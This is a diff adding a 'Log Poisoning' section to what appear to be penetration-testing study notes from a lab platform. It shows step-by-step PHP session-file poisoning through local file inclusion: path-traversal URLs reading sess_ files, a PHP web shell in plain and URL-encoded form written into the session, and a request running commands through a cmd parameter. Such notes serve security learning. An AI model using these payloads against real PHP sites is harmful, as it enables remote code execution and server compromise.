@@ -530,3 +530,83 @@ http://94.237.61.242:42157/index.php?language=phar://./profile_images/shell.jpg%
 ---
 
 ## Log Poisoning
+
+Log poisoning means that the result of an executed payload is logged in a logfile. For this type of attack to work, the attacker must be able to read the logfile through an LFI vulnerability. 
+
+### PHPSESSID Poisoning
+
+PHP applications utilize **PHPSESSID** cookies to keep track of session-related user details. These details are stored in session files located in the following directories:
+
+- /var/lib/php/sessions/ (Linux)
+- C:\Windows\Temp\ (Windows)
+
+The name of the session file matches the **PHPSESSID** cookie value, prefixed with **sess_**. 
+
+**Example:**
+
+```
+/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3
+
+C:\Windows\Temp\sess_el4ukv0kqbvoirg7nkp4dncpk3
+```
+
+When intercepting a request in BurpSuite, the **PHPSESSID** is visible in the request:
+
+![Filtered output](images/php-sess-id.png)
+
+**Step 1:**
+
+Attempt to read the **PHPSESSID** through LFI:
+
+```bash
+http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic
+```
+
+![Filtered output](images/php-sess-id-lfi.png)
+
+We can indeed read the **PHPSESSID** log file.
+
+**Step 2:**
+
+Change the value of the GET parameter in order to see if it is reflected in the session file:
+
+```bash
+# Log value
+http://94.237.48.12:41125/index.php?language=log_poisoning
+
+
+# Read log file through LFI
+http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic
+```
+
+![Filtered output](images/log-poisoning.png)
+
+The value is reflected in the log file. PHP automatically stores request parameters and session data inside the session file, which makes it possible to inject executable PHP code.
+
+**Step 3:**
+
+Poison the log file by writing a URL encoded web shell to it:
+
+```bash
+# Web shell
+<?php system($_GET["cmd"]);?>
+
+# URL encoded web shell
+%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+# Write web shell to logfile
+http://94.237.48.12:41125/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+```
+
+**Step 4:**
+
+Include the log file in an LFI and execute commands through the `cmd` parameter:
+
+```bash
+http://94.237.48.12:41125/index.php?language=../../../var/lib/php/sessions/sess_4uln7ifh9us3lmej4u5lsd88ic&cmd=id
+```
+
+![Filtered output](images/log-poisoning2.png)
+
+Keep in mind that the session file is rewritten on subsequent requests, overwriting the injected payload. To execute another command the log file has to be re-poisoned with the web shell.
